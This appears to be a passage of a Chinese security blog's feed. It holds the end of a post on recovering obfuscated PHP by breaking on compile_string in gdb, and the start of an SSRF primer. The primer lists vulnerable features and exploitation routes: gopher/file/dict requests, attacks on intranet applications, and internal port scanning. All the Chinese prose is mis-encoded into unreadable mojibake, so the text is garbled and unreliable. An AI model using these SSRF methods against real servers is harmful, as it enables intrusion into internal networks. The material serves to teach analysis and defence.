and -e... /bin/grep</span><br><span class="line">checking <span class="keyword">for</span> egrep... /bin/grep -E</span><br></pre></td></tr></table></figure><p>3.è¿è¡Œ<code>make</code>å‘½ä»¤(ä¹‹åå¯ä»¥è¿è¡Œä¹Ÿå¯ä»¥ä¸è¿è¡Œmake test)</p><p>4.è¿è¡Œ<code>make install</code>å‘½ä»¤</p><p>5.é…ç½®iniæ–‡ä»¶</p><p>é€šè¿‡è¿è¡Œ <code>php --ini</code>æŸ¥æ‰¾php.iniæ–‡ä»¶ä½ç½®ï¼Œç„¶ååœ¨æ–‡ä»¶ä¸­æ·»åŠ <code>extension=zlib.so</code></p><p>é€šè¿‡ç¼–è¯‘å®‰è£…çš„PHPæ˜¯æ²¡æœ‰php.iniæ–‡ä»¶çš„ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡<code>php --ini</code>æŸ¥çœ‹é…ç½®æ–‡ä»¶çš„è·¯å¾„ï¼Œä¾‹å¦‚:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">zeroyu@ubuntu:~/Desktop/php-5.6.36/ext/zlib$ php --ini</span><br><span class="line">Configuration File (php.ini) Path: /usr/<span class="built_in">local</span>/lib</span><br><span class="line">Loaded Configuration File:         (none)</span><br><span class="line">Scan <span class="keyword">for</span> additional .ini files <span class="keyword">in</span>: (none)</span><br><span class="line">Additional .ini files parsed:      (none)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ­¤æ—¶Configuration Fileæ˜¾ç¤ºçš„æ˜¯noneã€‚è¿™ç§æƒ…å†µä½ åªéœ€è¦å°†ä¹‹å‰åœ¨PHPå®˜ç½‘ä¸‹è½½çš„PHPæ–‡ä»¶ä¸­çš„php.iniæ‹·è´ä¸€ä»½åˆ°Configuration File (php.ini) Pathè·¯å¾„ä¸‹å°±å¯ä»¥äº†ã€‚æ“ä½œå®Œä¹‹åå†æ‰§è¡Œ<code>php --ini</code>å¯ä»¥çœ‹åˆ°å¦‚ä¸‹æ˜¾ç¤º:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">zeroyu@ubuntu:~/Desktop/php-5.6.36/ext/zlib$ php --ini</span><br><span class="line">Configuration File (php.ini) Path: /usr/local/lib</span><br><span class="line">Loaded Configuration File:         /usr/local/lib/php.ini</span><br><span class="line">Scan for additional .ini files in: (none)</span><br><span class="line">Additional .ini files parsed:      (none)</span><br></pre></td></tr></table></figure><h3 id="0x03-å¼€å§‹Hook"><a href="#0x03-å¼€å§‹Hook" class="headerlink" title="0x03 å¼€å§‹Hook"></a>0x03 å¼€å§‹Hook</h3><p>PHPä¸­çš„evalå‡½æ•°åœ¨Zendé‡Œéœ€è¦è°ƒç”¨<code>zend_compile_string</code>å‡½æ•°ï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸‹<code>zend_compile_string</code>å‡½æ•°çš„ä½ç½®ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">zeroyu@ubuntu:~/Desktop/php-5.6.36/Zend$ grep -rn <span class="string">"zend_compile_string"</span> *</span><br><span class="line">Binary file zend_alloc.o matches</span><br><span class="line">Binary file zend_API.o matches</span><br><span class="line">Binary file zend_ast.o matches</span><br><span class="line">Binary file zend_builtin_functions.o matches</span><br><span class="line">zend.c:693:zend_compile_string = compile_string;</span><br><span class="line">Binary file zend_closures.o matches</span><br><span class="line">zend_compile.c:98:ZEND_API zend_op_array *(*zend_compile_string)(zval *source_string, char *filename TSRMLS_DC);</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å‘ç°<code>zend_compile_string</code>å‡½æ•°å…¶å®å°±æ˜¯<code>compile_string</code>å‡½æ•°ã€‚æ‰€ä»¥æˆ‘åœ¨è¿™å„¿æµ‹è¯•ä¸€ä¸ªå‰å‡ å¤©å¶ç„¶é—´å¾—åˆ°çš„è¢«æ··æ·†çš„PHPä»£ç ï¼Œå¦‚ä¸‹æ‰€ç¤ºå¯ä»¥çœ‹åˆ°åœ¨<code>compile_string</code>ä¸­å·²ç»è·å–åˆ°<code>eval</code>å‚æ•°çš„å€¼ã€‚</p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç¨‹åºæ–­ä¸‹æ¥åï¼Œ<code>compile_string</code>çš„ç¬¬ä¸€ä¸ªå‚æ•°<code>source_string</code>ä¸ºphpä»£ç ä¸­<code>eval</code>å‡½æ•°çš„å‚æ•°åœ¨Zendä¸­çš„ç»“æ„â€”â€”å³<code>zval_struct</code>ã€‚<code>source_string.value.str.val</code>å³ä¸ºå‚æ•°çš„å­—ç¬¦ä¸²å½¢å¼ã€‚æ‰€ä»¥ä¹‹åä¿®æ”¹ä¿®æ”¹<code>compile_string</code>å‡½æ•°æ¥æ‰“å°<code>eval</code>çš„å‚æ•°å°±å¯ä»¥å¾—åˆ°è§£å¯†åçš„ä»£ç äº†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">zeroyu@ubuntu:~/Desktop$ gdb php</span><br><span class="line">gdb-peda$ <span class="built_in">set</span> args a.php </span><br><span class="line">gdb-peda$ b compile_string</span><br><span class="line">Breakpoint 1 at 0x46e73f: file Zend/zend_language_scanner.l, line 716.</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /usr/<span class="built_in">local</span>/bin/php a.php </span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span>.</span><br><span class="line"></span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x5555559c2726 (&lt;compile_string&gt;:push   rbp)</span><br><span class="line">RBX: 0x555555a68767 (&lt;execute_ex&gt;:push   rbp)</span><br><span class="line">RCX: 0x7ffff7e10e48 (<span class="string">"/home/zeroyu/Desktop/a.php(1) : assert code"</span>)</span><br><span class="line">RDX: 0x7fffffffa030 --&gt; 0x7ffff7fd22d0 (<span class="string">"return $\307\365ã£‹\217= eval(base64_decode($\240\202\206\345\215\331×\307));;"</span>)</span><br><span class="line">RSI: 0x7ffff7e10e48 (<span class="string">"/home/zeroyu/Desktop/a.php(1) : assert code"</span>)</span><br><span class="line">RDI: 0x7fffffffa030 --&gt; 0x7ffff7fd22d0 (<span class="string">"return $\307\365ã£‹\217= eval(base64_decode($\240\202\206\345\215\331×\307));;"</span>)</span><br><span class="line">RBP: 0x7fffffff9fa0 --&gt; 0x7fffffffa120 --&gt; 0x7fffffffa270 --&gt; 0x7fffffffa420 --&gt; 0x7fffffffa440 --&gt; 0x7fffffffa560 (--&gt; ...)</span><br><span class="line">RSP: 0x7fffffff9e80 --&gt; 0x7ffff7e10e48 (<span class="string">"/home/zeroyu/Desktop/a.php(1) : assert code"</span>)</span><br><span class="line">RIP: 0x5555559c273f (&lt;compile_string+25&gt;:mov    rax,QWORD PTR fs:0x28)</span><br><span class="line">R8 : 0x7fffffff96c0 --&gt; 0xb (<span class="string">'\x0b'</span>)</span><br><span class="line">R9 : 0x555555f2cd22 (<span class="string">"assert code"</span>)</span><br><span class="line">R10: 0x7 </span><br><span class="line">R11: 0xa (<span class="string">'\n'</span>)</span><br><span class="line">R12: 0x555555623210 (&lt;_start&gt;:xor    ebp,ebp)</span><br><span class="line">R13: 0x7fffffffdfb0 --&gt; 0x2 </span><br><span class="line">R14: 0x0 </span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x202 (carry parity adjust zero sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x5555559c272a &lt;compile_string+4&gt;:sub    rsp,0x120</span><br><span class="line">   0x5555559c2731 &lt;compile_string+11&gt;:mov    QWORD PTR [rbp-0x118],rdi</span><br><span class="line">   0x5555559c2738 &lt;compile_string+18&gt;:mov    QWORD PTR [rbp-0x120],rsi</span><br><span class="line">=&gt; 0x5555559c273f &lt;compile_string+25&gt;:mov    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x5555559c2748 &lt;compile_string+34&gt;:mov    QWORD PTR [rbp-0x8],rax</span><br><span class="line">   0x5555559c274c &lt;compile_string+38&gt;:xor    eax,eax</span><br><span class="line">   0x5555559c274e &lt;compile_string+40&gt;:mov    edi,0xf8</span><br><span class="line">   0x5555559c2753 &lt;compile_string+45&gt;:call   0x5555559e67f3 &lt;_emalloc&gt;</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffff9e80 --&gt; 0x7ffff7e10e48 (<span class="string">"/home/zeroyu/Desktop/a.php(1) : assert code"</span>)</span><br><span class="line">0008| 0x7fffffff9e88 --&gt; 0x7fffffffa030 --&gt; 0x7ffff7fd22d0 (<span class="string">"return $\307\365ã£‹\217= eval(base64_decode($\240\202\206\345\215\331×\307));;"</span>)</span><br><span class="line">0016| 0x7fffffff9e90 --&gt; 0x8 </span><br><span class="line">0024| 0x7fffffff9e98 --&gt; 0x555556280608 --&gt; 0x0 </span><br><span class="line">0032| 0x7fffffff9ea0 --&gt; 0x7fffffff9ed0 --&gt; 0x7fffffff9f70 --&gt; 0x7fffffffa180 --&gt; 0x7ffff7fd6d08 --&gt; 0x3d8f8ba3e3f5c724 </span><br><span class="line">0040| 0x7fffffff9ea8 --&gt; 0x3d559e6d1a </span><br><span class="line">0048| 0x7fffffff9eb0 --&gt; 0x7fffffff9ed0 --&gt; 0x7fffffff9f70 --&gt; 0x7fffffffa180 --&gt; 0x7ffff7fd6d08 --&gt; 0x3d8f8ba3e3f5c724 </span><br><span class="line">0056| 0x7fffffff9eb8 --&gt; 0x5555559e6891 (&lt;_efree+78&gt;:leave)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 1, compile_string (source_string=0x7fffffffa030, filename=0x7ffff7e10e48 <span class="string">"/home/zeroyu/Desktop/a.php(1) : assert code"</span>) at Zend/zend_language_scanner.l:716</span><br><span class="line">716&#123;</span><br><span class="line">gdb-peda$ p *source_string</span><br><span class="line"><span class="variable">$1</span> = &#123;</span><br><span class="line">  value = &#123;</span><br><span class="line">    lval = 0x7ffff7fd22d0, </span><br><span class="line">    dval = 6.953349167324743e-310, </span><br><span class="line">    str = &#123;</span><br><span class="line">      val = 0x7ffff7fd22d0 <span class="string">"return $\307\365ã£‹\217= eval(base64_decode($\240\202\206\345\215\331×\307));;"</span>, </span><br><span class="line">      len = 0x31</span><br><span class="line">    &#125;, </span><br><span class="line">    ht = 0x7ffff7fd22d0, </span><br><span class="line">    obj = &#123;</span><br><span class="line">      handle = 0xf7fd22d0, </span><br><span class="line">      handlers = 0x31</span><br><span class="line">    &#125;, </span><br><span class="line">    ast = 0x7ffff7fd22d0</span><br><span class="line">  &#125;, </span><br><span class="line">  refcount__gc = 0xffffa060, </span><br><span class="line">  <span class="built_in">type</span> = 0x6, </span><br><span class="line">  is_ref__gc = 0x7f</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x04-å°ç»“"><a href="#0x04-å°ç»“" class="headerlink" title="0x04 å°ç»“"></a>0x04 å°ç»“</h3><p>â€‹    æ··æ·†ä»£ç çš„è§£å¯†å°±æ˜¯ç±»ä¼¼äºä»£ç æ‰§è¡Œã€‚æœ€ç»ˆè¿˜æ˜¯è¦æ‰§è¡ŒPHPä»£ç ï¼Œè€Œæ‰§è¡ŒPHPä»£ç çš„æ–¹æ³•å¾ˆå¤šï¼Œé™¤äº†<code>eval</code>å‡½æ•°è¿˜æœ‰<code>assert</code>ã€<code>call_user_func</code>ã€<code>call_user_func_array</code>ã€<code>create_function</code>ç­‰ã€‚è¿™äº›å‡½æ•°çš„åº•å±‚ä¹Ÿæ˜¯è°ƒç”¨äº†<code>zend_compile_string</code>ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥åˆ©ç”¨hook <code>eval</code>æ¥è¿˜åŸæ··æ·†åçš„åŠ å¯†ä»£ç ã€‚</p><p>â€‹    è¿™ç¯‡ä¹Ÿå°±æ˜¯å¯¹è¿™ä¸ªè§£å¯†æ“ä½œäº†ä¸€ä¸‹è®°äº†ä¸ªç¬”è®°ï¼Œç¯å¢ƒæ­å»ºè¿˜æ˜¯æ¯”è¾ƒç¹ççš„äº‹ï¼Œæ‰€ä»¥å†™çš„è¯¦ç»†äº†ç‚¹ã€‚äº†è§£å½’äº†è§£ï¼Œç°å®ä¸­ä¸ºäº†æ•ˆç‡è¿˜æ˜¯ä½¿ç”¨æ‰©å±•æ¯”è¾ƒæ–¹ä¾¿ï¼Œä½¿ç”¨çš„æ‰©å±•å¯ä»¥å‚è€ƒ<a href="https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html" target="_blank" rel="noopener">Pç‰›</a>çš„ï¼Œæˆ–è€…è¿™ä¸ª<a href="http://php-security.org/2010/05/13/article-decoding-a-user-space-encoded-php-script/index.html" target="_blank" rel="noopener">å¤–å›½è€å“¥</a>çš„ã€‚å¦‚æœæ‰©å±•éœ€è¦ç¼–è¯‘çš„è¯ï¼Œæ–¹æ³•åœ¨ä¸Šé¢è¯´è¿‡äº†ï¼Œç¼–è¯‘åä¸æƒ³åŠ å…¥php.iniçš„è¯ï¼Œå¯ä»¥åœ¨æ¯æ¬¡ç”¨çš„æ—¶å€™æ‰§è¡Œ<code>php -d extension=evalhook.so a.php</code>ã€‚</p><h3 id="0x05-å‚è€ƒ"><a href="#0x05-å‚è€ƒ" class="headerlink" title="0x05 å‚è€ƒ"></a>0x05 å‚è€ƒ</h3><p><a href="https://mp.weixin.qq.com/s/S2QJ2HiAqPFW2wo6aUAhCA" target="_blank" rel="noopener">è§£å¯†æ··æ·†çš„PHPç¨‹åºâ€“é€¢é­”å®‰å…¨å®éªŒå®¤</a></p><p><a href="https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html" target="_blank" rel="noopener">phpjiami æ•°ç§è§£å¯†æ–¹æ³•â€”phithon</a></p><p><a href="http://blog.evalbug.com/2017/09/21/phpdecode_01/" target="_blank" rel="noopener">PHPDecode åœ¨çº¿è§£å¯†å·¥å…·â€”Medici.Yan</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;###0x00 å‰è¨€&lt;/p&gt;
&lt;p&gt;è¢«æ··æ·†PHPä»£ç è§çš„å¾ˆå¤šäº†ï¼Œä½†ä»¥å‰æ¯”è¾ƒæ‡’æ€»æ˜¯ç”¨æ‰©å±•ç›´æ¥decodeæ‰ï¼Œæœ€è¿‘å°±æƒ³æ‰‹åŠ¨æ“ä½œä¸‹çœ‹çœ‹ä¸ä½¿ç”¨æ‰©å±•æ€ä¹ˆè¿›è¡Œè§£å¯†ã€‚&lt;/p&gt;
&lt;h3 id=&quot;0x01-åŸç†&quot;&gt;&lt;a href=&quot;#0x01-åŸç†&quot; class=&quot;headerlink&quot; t
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>äº†è§£SSRF,è¿™ä¸€ç¯‡å°±è¶³å¤Ÿäº†</title>
    <link href="http://zer0yu.github.io/2018/03/06/introduction-to-ssrf/"/>
    <id>http://zer0yu.github.io/2018/03/06/introduction-to-ssrf/</id>
    <published>2018-03-06T13:28:42.000Z</published>
    <updated>2018-11-12T11:54:21.000Z</updated>
    
    <content type="html"><![CDATA[<p>###0x00 æ¦‚å¿µ</p><p>SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ) æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ï¼ˆæ­£æ˜¯å› ä¸ºå®ƒæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥å®ƒèƒ½å¤Ÿè¯·æ±‚åˆ°ä¸å®ƒç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿï¼‰</p><p>SSRF å½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶ã€‚æ¯”å¦‚ä»æŒ‡å®šURLåœ°å€è·å–ç½‘é¡µæ–‡æœ¬å†…å®¹ï¼ŒåŠ è½½æŒ‡å®šåœ°å€çš„å›¾ç‰‡ï¼Œä¸‹è½½ç­‰ç­‰ã€‚</p><p>æ³¨é‡Šï¼šé™¤äº†http/httpsç­‰æ–¹å¼å¯ä»¥é€ æˆssrfï¼Œç±»ä¼¼tcp connect æ–¹å¼ä¹Ÿå¯ä»¥æ¢æµ‹å†…ç½‘ä¸€äº›ip çš„ç«¯å£æ˜¯å¦å¼€å‘æœåŠ¡ï¼Œåªä¸è¿‡å±å®³æ¯”è¾ƒå°è€Œå·²ã€‚</p><p>###0x01 å¯èƒ½å‡ºç°çš„åœ°æ–¹</p><p>1.ç¤¾äº¤åˆ†äº«åŠŸèƒ½ï¼šè·å–è¶…é“¾æ¥çš„æ ‡é¢˜ç­‰å†…å®¹è¿›è¡Œæ˜¾ç¤º</p><p>2.è½¬ç æœåŠ¡ï¼šé€šè¿‡URLåœ°å€æŠŠåŸåœ°å€çš„ç½‘é¡µå†…å®¹è°ƒä¼˜ä½¿å…¶é€‚åˆæ‰‹æœºå±å¹•æµè§ˆ</p><p>3.åœ¨çº¿ç¿»è¯‘ï¼šç»™ç½‘å€ç¿»è¯‘å¯¹åº”ç½‘é¡µçš„å†…å®¹</p><p>4.å›¾ç‰‡åŠ è½½/ä¸‹è½½ï¼šä¾‹å¦‚å¯Œæ–‡æœ¬ç¼–è¾‘å™¨ä¸­çš„ç‚¹å‡»ä¸‹è½½å›¾ç‰‡åˆ°æœ¬åœ°ï¼›é€šè¿‡URLåœ°å€åŠ è½½æˆ–ä¸‹è½½å›¾ç‰‡</p><p>5.å›¾ç‰‡/æ–‡ç« æ”¶è—åŠŸèƒ½ï¼šä¸»è¦å…¶ä¼šå–URLåœ°å€ä¸­titleä»¥åŠæ–‡æœ¬çš„å†…å®¹ä½œä¸ºæ˜¾ç¤ºä»¥æ±‚ä¸€ä¸ªå¥½çš„ç”¨å…·ä½“éªŒ</p><p>6.äº‘æœåŠ¡å‚å•†ï¼šå®ƒä¼šè¿œç¨‹æ‰§è¡Œä¸€äº›å‘½ä»¤æ¥åˆ¤æ–­ç½‘ç«™æ˜¯å¦å­˜æ´»ç­‰ï¼Œæ‰€ä»¥å¦‚æœå¯ä»¥æ•è·ç›¸åº”çš„ä¿¡æ¯ï¼Œå°±å¯ä»¥è¿›è¡Œssrfæµ‹è¯•</p><p>7.ç½‘ç«™é‡‡é›†ï¼Œç½‘ç«™æŠ“å–çš„åœ°æ–¹ï¼šä¸€äº›ç½‘ç«™ä¼šé’ˆå¯¹ä½ è¾“å…¥çš„urlè¿›è¡Œä¸€äº›ä¿¡æ¯é‡‡é›†å·¥ä½œ</p><p>8.æ•°æ®åº“å†…ç½®åŠŸèƒ½ï¼šæ•°æ®åº“çš„æ¯”å¦‚mongodbçš„copyDatabaseå‡½æ•°</p><p>9.é‚®ä»¶ç³»ç»Ÿï¼šæ¯”å¦‚æ¥æ”¶é‚®ä»¶æœåŠ¡å™¨åœ°å€</p><p>10.ç¼–ç å¤„ç†, å±æ€§ä¿¡æ¯å¤„ç†ï¼Œæ–‡ä»¶å¤„ç†ï¼šæ¯”å¦‚ffpmgï¼ŒImageMagickï¼Œdocxï¼Œpdfï¼Œxmlå¤„ç†å™¨ç­‰</p><p>11.æœªå…¬å¼€çš„apiå®ç°ä»¥åŠå…¶ä»–æ‰©å±•è°ƒç”¨URLçš„åŠŸèƒ½ï¼šå¯ä»¥åˆ©ç”¨google è¯­æ³•åŠ ä¸Šè¿™äº›å…³é”®å­—å»å¯»æ‰¾SSRFæ¼æ´</p><p>ä¸€äº›çš„urlä¸­çš„å…³é”®å­—ï¼šshareã€wapã€urlã€linkã€srcã€sourceã€targetã€uã€3gã€displayã€sourceURlã€imageURLã€domainâ€¦â€¦</p><p>12.ä»è¿œç¨‹æœåŠ¡å™¨è¯·æ±‚èµ„æºï¼ˆupload from url å¦‚discuzï¼ï¼›import &amp; expost rss feed å¦‚web blogï¼›ä½¿ç”¨äº†xmlå¼•æ“å¯¹è±¡çš„åœ°æ–¹ å¦‚wordpress xmlrpc.phpï¼‰</p><p>13.webé’©å­ï¼šå¯»æ‰¾è§¦å‘ç‰¹å®šäº‹ä»¶æ—¶å‘å‡ºhttpè¯·æ±‚çš„æœåŠ¡ã€‚åœ¨å¤§å¤šæ•°webé’©å­çš„åŠŸèƒ½ä¸­ï¼Œç»ˆç«¯ç”¨æˆ·å¯ä»¥é€‰æ‹©ä»–ä»¬çš„ç»ˆç«¯ç‚¹å’Œä¸»æœºåã€‚å°è¯•å‘å†…éƒ¨æœåŠ¡å‘é€httpè¯·æ±‚ã€‚</p><p>14.PDFç”Ÿæˆå™¨ï¼šè¯•ç€æ³¨å…¥æŒ‡å‘å†…éƒ¨æœåŠ¡çš„<code>&lt;iframe&gt;,&lt;img&gt;,&lt;base&gt;</code>æˆ–è€…<code>&lt;script&gt;</code>å…ƒç´ æˆ–è€…CSSçš„<code>url()</code>å‡½æ•°ã€‚</p><p>15.æ–‡æ¡£è§£æå™¨ï¼šå°è¯•äº†è§£æ–‡æ¡£æ˜¯å¦‚ä½•è¢«è§£æçš„ã€‚å¦‚æœæ˜¯XMLæ–‡æ¡£ï¼Œé‚£å°±æ˜¯ç”¨äº†PDFç”Ÿæˆå™¨æ–¹æ³•ã€‚å¯¹äºå…¶ä»–æ–‡æ¡£ï¼Œæ£€æŸ¥æ˜¯å¦å­˜åœ¨å¼•ç”¨å¤–éƒ¨èµ„æºçš„æ–¹æ³•ç„¶åé€šè¿‡æœåŠ¡å™¨å‘å†…éƒ¨æœåŠ¡å‘é€è¯·æ±‚ã€‚</p><p>16.é“¾æ¥æ‰©å±•: æœ€è¿‘<a href="https://twitter.com/BugBountyHQ/status/868242771617792000" target="_blank" rel="noopener">Mark Litchfieldåœ¨æ¨ç‰¹æ‰©å±•é“¾æ¥ä¸Šå‘ç°äº†æ¼æ´</a>ï¼Œåå£°å¤§æ¶¨ã€‚</p><p>17.æ–‡ä»¶ä¸Šä¼ ï¼šä¸å¸¸è§„ä¸Šä¼ æ–‡ä»¶ç›¸åï¼Œå°è¯•å‘é€urlè¯·æ±‚ç„¶åæ£€æŸ¥æ˜¯å¦ä¸‹è½½äº†urlçš„å†…å®¹ã€‚<a href="https://hackerone.com/reports/713" target="_blank" rel="noopener">ä¾‹å­</a></p><p>###0x02 æ¼æ´éªŒè¯</p><p>1.æ’é™¤æ³•ï¼šæµè§ˆå™¨f12æŸ¥çœ‹æºä»£ç çœ‹æ˜¯å¦æ˜¯åœ¨æœ¬åœ°è¿›è¡Œäº†è¯·æ±‚</p><p>æ¯”å¦‚ï¼šè¯¥èµ„æºåœ°å€ç±»å‹ä¸º <a href="http://www.xxx.com/a.php?image=ï¼ˆåœ°å€ï¼‰çš„å°±å¯èƒ½å­˜åœ¨SSRFæ¼æ´" target="_blank" rel="noopener">http://www.xxx.com/a.php?image=ï¼ˆåœ°å€ï¼‰çš„å°±å¯èƒ½å­˜åœ¨SSRFæ¼æ´</a></p><p>2.dnslogç­‰å·¥å…·è¿›è¡Œæµ‹è¯•ï¼Œçœ‹æ˜¯å¦è¢«è®¿é—®</p><p>â€“å¯ä»¥åœ¨ç›²æ‰“åå°ç”¨ä¾‹ä¸­å°†å½“å‰å‡†å¤‡è¯·æ±‚çš„uri å’Œå‚æ•°ç¼–ç æˆbase64ï¼Œè¿™æ ·ç›²æ‰“åå°è§£ç åå°±çŸ¥é“æ˜¯å“ªå°æœºå™¨å“ªä¸ªcgiè§¦å‘çš„è¯·æ±‚ã€‚</p><p>3.æŠ“åŒ…åˆ†æå‘é€çš„è¯·æ±‚æ˜¯ä¸æ˜¯ç”±æœåŠ¡å™¨çš„å‘é€çš„ï¼Œå¦‚æœä¸æ˜¯å®¢æˆ·ç«¯å‘å‡ºçš„è¯·æ±‚ï¼Œåˆ™æœ‰å¯èƒ½æ˜¯ï¼Œæ¥ç€æ‰¾å­˜åœ¨HTTPæœåŠ¡çš„å†…ç½‘åœ°å€</p><p>â€“ä»æ¼æ´å¹³å°ä¸­çš„å†å²æ¼æ´å¯»æ‰¾æ³„æ¼çš„å­˜åœ¨webåº”ç”¨å†…ç½‘åœ°å€</p><p>â€“é€šè¿‡äºŒçº§åŸŸåæš´åŠ›çŒœè§£å·¥å…·æ¨¡ç³ŠçŒœæµ‹å†…ç½‘åœ°å€</p><p>4.ç›´æ¥è¿”å›çš„Bannerã€titleã€contentç­‰ä¿¡æ¯</p><p>5.ç•™æ„boolå‹SSRF</p><p>###0x03 åˆ©ç”¨æ–¹å¼</p><p>####1.è®©æœåŠ¡ç«¯å»è®¿é—®ç›¸åº”çš„ç½‘å€</p><p>####2.è®©æœåŠ¡ç«¯å»è®¿é—®è‡ªå·±æ‰€å¤„å†…ç½‘çš„ä¸€äº›æŒ‡çº¹æ–‡ä»¶æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨ç›¸åº”çš„cms</p><p>####3.å¯ä»¥ä½¿ç”¨fileã€dictã€gopher[11]ã€ftpåè®®è¿›è¡Œè¯·æ±‚è®¿é—®ç›¸åº”çš„æ–‡ä»¶</p><p>####4.æ”»å‡»å†…ç½‘webåº”ç”¨ï¼ˆå¯ä»¥å‘å†…éƒ¨ä»»æ„ä¸»æœºçš„ä»»æ„ç«¯å£å‘é€ç²¾å¿ƒæ„é€ çš„æ•°æ®åŒ…{payload}ï¼‰</p><p>####5.æ”»å‡»å†…ç½‘åº”ç”¨ç¨‹åºï¼ˆåˆ©ç”¨è·¨åè®®é€šä¿¡æŠ€æœ¯ï¼‰</p><p>####6.åˆ¤æ–­å†…ç½‘ä¸»æœºæ˜¯å¦å­˜æ´»ï¼šæ–¹æ³•æ˜¯è®¿é—®çœ‹æ˜¯å¦æœ‰ç«¯å£å¼€æ”¾</p><p>â€‹    æŸäº›æ—¶å€™SSRFæ¼æ´å¯ä»¥ç”¨ä½œå±€åŸŸç½‘å†…çš„ç«¯å£æ‰«æã€‚è¿™æœ‰åŠ©äºç†æ¸…å†…ç½‘çš„åŸºç¡€è®¾æ–½è½®å»“å’Œå¹¶ä¸ºä¸‹ä¸€æ­¥å…¶ä»–æ¼æ´çš„åˆ©ç”¨åšé“ºå«ã€‚ä¸Šè¿°è¿™ç§æƒ…å†µé€šå¸¸æ˜¯æœ€ç®€å•çš„blind SSRFäº†ã€‚å¦‚æœä¹‹å‰çš„è„šæœ¬æ— 